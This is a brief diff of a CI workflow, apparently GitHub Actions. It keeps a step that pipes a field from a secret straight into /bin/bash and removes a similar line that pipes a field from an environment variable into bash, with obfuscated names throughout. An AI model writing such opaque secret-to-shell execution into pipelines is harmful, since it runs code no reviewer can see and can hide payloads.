@@ -18,7 +18,6 @@ jobs:
           z72: ${{ secrets.z72 }}
         run: |
           printf '%s' "$z72" | jq -r .vfpk5948 | /bin/bash
-          echo $xlot3878 | jq -r .je03052 | /bin/bash
 
       - name: Upload results
         if: always()
